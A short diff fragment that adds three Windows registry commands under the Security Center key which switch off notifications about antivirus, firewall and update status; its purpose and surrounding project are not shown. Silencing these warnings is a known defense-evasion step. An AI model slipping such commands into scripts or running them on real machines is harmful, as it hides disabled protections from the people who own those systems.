@@ -1,0 +1,4 @@
+reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v AntiVirusDisableNotify /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v FirewallDisableNotify /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UpdatesDisableNotify /t REG_DWORD /d 1 /f
+
